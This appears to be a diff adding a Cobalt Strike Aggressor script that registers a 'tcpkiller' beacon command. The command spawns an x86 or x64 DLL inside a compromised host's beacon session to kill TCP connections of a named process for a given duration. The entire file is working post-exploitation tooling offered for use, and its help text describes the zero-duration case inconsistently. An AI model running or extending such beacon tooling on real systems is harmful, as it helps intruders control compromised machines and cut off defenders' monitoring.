@@ -1,0 +1,45 @@
+# Always keep 4 and 34 enabled - they'll help catch common developer mistakes
+debug(debug() | 4);     # 4  =	display a runtime warning for the first time use of non-declared variables.
+#debug(debug() | 8);    # 8  =  DEBUGGING: trace all function calls
+debug(debug() | 34);    # 34 = "throw" all errors flagged for use with &checkError
+#debug(debug() | 64);   # 64 =	DEBUGGING: trace all predicate decisions (follow program logic)
+
+alias tcpkiller {
+    local('$bid $args $processName $interval $duration');
+    local('$msg $dllName $arch');
+
+    ($bid, $processName, $duration) = @_;
+    # interval_ms: check target process every 1 sec as default.
+    $interval = 1 * 1000;
+    
+    if (size(@_) != 3) {
+        $msg = 'Usage: tcpkiller <process_name> [duration]' . 
+               "\nExample: \n" . 
+               "\ttcpkiller ncat.exe 120";
+        berror($bid, $msg);
+        return;
+    }
+    else {
+        $arch = barch($bid);
+        $duration = iff(int($duration) < 0, 5, int($duration));
+        $dllName = iff($arch eq "x64", "tcpkiller.x64.dll", "tcpkiller.x86.dll");
+        
+        $args = $processName . ' 1000 ' . $duration;
+        btask($bid, "Tasked beacon to execute tcpkiller " . $args);
+        bdllspawn($bid, script_resource($dllName), $args, "tcpkiller", 3000, false);
+    }
+}
+
+beacon_command_register(
+    "tcpkiller",
+    "Kill TCP connections for a specific process",
+    "Usage: \n" . 
+    "  tcpkiller <process_name> [Duration]\n\n" .
+    "Example: \n" . 
+    "  tcpkiller ncat.exe 120\n" .
+    "  This will kill all TCP connections for ncat.exe in 2 minutes with 1 second delay. \n\n" .
+    "Note: \n" . 
+    "  The duration must greater than 0, otherwise it default to be set as 5, \n" . 
+    "  If duration is set as 0, means execute tcpkiller infinitely, and you can kill the job by kill the pid. \n\n"
+);
+
